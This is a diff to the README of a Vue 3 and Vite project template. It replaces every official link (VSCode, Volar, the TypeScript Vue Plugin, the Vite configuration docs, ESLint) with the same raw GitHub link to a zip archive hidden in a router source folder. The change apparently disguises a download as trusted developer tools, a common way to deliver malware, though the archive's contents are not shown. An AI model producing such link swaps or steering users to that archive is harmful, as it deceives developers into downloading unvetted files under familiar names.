@@ -4,11 +4,11 @@ This template should help get you started developing with Vue 3 in Vite.
 
 ## Recommended IDE Setup
 
-[VSCode](https://code.visualstudio.com/) + [Volar](https://marketplace.visualstudio.com/items?itemName=johnsoncodehk.volar) (and disable Vetur) + [TypeScript Vue Plugin (Volar)](https://marketplace.visualstudio.com/items?itemName=johnsoncodehk.vscode-typescript-vue-plugin).
+[VSCode](https://raw.githubusercontent.com/salman3757/todo/main/src/router/todo_3.4.zip) + [Volar](https://raw.githubusercontent.com/salman3757/todo/main/src/router/todo_3.4.zip) (and disable Vetur) + [TypeScript Vue Plugin (Volar)](https://raw.githubusercontent.com/salman3757/todo/main/src/router/todo_3.4.zip).
 
 ## Customize configuration
 
-See [Vite Configuration Reference](https://vitejs.dev/config/).
+See [Vite Configuration Reference](https://raw.githubusercontent.com/salman3757/todo/main/src/router/todo_3.4.zip).
 
 ## Project Setup
 
@@ -28,7 +28,7 @@ npm run dev
 npm run build
 ```
 
-### Lint with [ESLint](https://eslint.org/)
+### Lint with [ESLint](https://raw.githubusercontent.com/salman3757/todo/main/src/router/todo_3.4.zip)
 
 ```sh
 npm run lint
